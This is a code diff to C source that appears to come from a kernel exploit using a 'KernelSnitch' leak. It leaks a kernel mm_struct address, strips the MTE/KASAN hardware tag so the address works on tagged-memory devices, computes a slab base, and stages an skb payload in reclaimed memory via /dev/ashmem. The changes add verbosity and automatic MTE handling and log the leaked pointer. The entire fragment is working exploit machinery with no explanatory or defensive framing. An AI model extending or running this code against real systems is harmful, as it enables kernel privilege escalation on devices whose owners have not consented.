@@ -13,6 +13,11 @@ static int get_ksnitch_collisions(void) {
   }
   return KSNITCH_COLLISIONS;
 }
+static int get_ksnitch_verbose(void) {
+  const char *arg = getenv("KSNITCH_VERBOSE");
+  if (arg) return atoi(arg) > 0;
+  return 1;
+}
 static unsigned char *skb_buf;
 static int reclaim_sv[2] = {-1, -1};
 static struct mm_ctx prepare_ctx;
@@ -35,7 +40,8 @@ char ashmem_path[256] = "/dev/ashmem";
 void setup_kernelsnitch(void) {
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, get_ksnitch_collisions(), 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, get_ksnitch_collisions(),
+      get_ksnitch_verbose(), kernelsnitch_mte_auto());
 }
 
 int kernelsnitch_collisions_ready(void) {
@@ -630,7 +636,8 @@ uintptr_t prepare_kernel_page(int payload_mode) {
 
   int cpu_count = (int)sysconf(_SC_NPROCESSORS_ONLN);
   ks = kernelsnitch_setup(
-      MM_STRUCT_SZ, MM_ORDER, cpu_count, get_ksnitch_collisions(), 0, 0);
+      MM_STRUCT_SZ, MM_ORDER, cpu_count, get_ksnitch_collisions(),
+      get_ksnitch_verbose(), kernelsnitch_mte_auto());
 
   for (size_t i = 0; i < pre_ctx.mm_cnt; i++) {
     pre_ctx.childs[i] = clone_child();
@@ -683,7 +690,12 @@ uintptr_t prepare_kernel_page(int payload_mode) {
     return 0;
   }
 
-  uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  /* strip the KASAN_HW_TAGS/MTE tag (bits 56-59) before using the address:
+   * the slab goes back to the buddy allocator (tag 0) and is reused by skb */
+  uintptr_t untagged = leaked & ~(0xfULL << 56);
+  uintptr_t base = untagged & ~(ORDER3_SIZE - 1);
+  pr_success("ksnitch mm_struct leaked=%016zx tag=%x slab_base=%016zx\n",
+             leaked, (unsigned)(leaked >> 56), base);
   if (!prepare_skb_payload(base, payload_mode)) {
     kernelsnitch_cleanup(ks);
     ks = NULL;
